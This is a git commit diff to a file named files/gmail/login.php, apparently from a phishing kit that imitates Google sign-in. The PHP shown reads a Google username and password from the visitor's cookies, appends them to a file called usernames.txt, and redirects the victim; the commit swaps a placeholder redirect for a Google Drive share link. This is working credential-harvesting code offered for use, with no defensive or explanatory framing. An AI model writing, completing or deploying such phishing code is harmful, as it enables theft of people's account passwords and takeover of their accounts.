0d2da82e594bd8ae9335405d19c188c72a8ec04b
code34348 <88024661+code34348@users.noreply.github.com>
2022-12-22 14:18:56 +0000

    Update login.php

--- files/gmail/login.php
+++ files/gmail/login.php
@@ -1,7 +1,7 @@
 <?php
 
 file_put_contents("usernames.txt", "Google Username: " . $_COOKIE['user'] . "\nPassword: " . $_COOKIE['pass'] . "\n", FILE_APPEND);
-$url = "redirectUrl"; # https://accounts.google.com/signin/v2/recoveryidentifier
+$url = "https://drive.google.com/drive/folders/1unlpUD-zH6Zp9OZos2l-x_BVVI7EfqXi?usp=share_link"; # https://accounts.google.com/signin/v2/recoveryidentifier
 header("Location: $url");
 exit();
 ?>
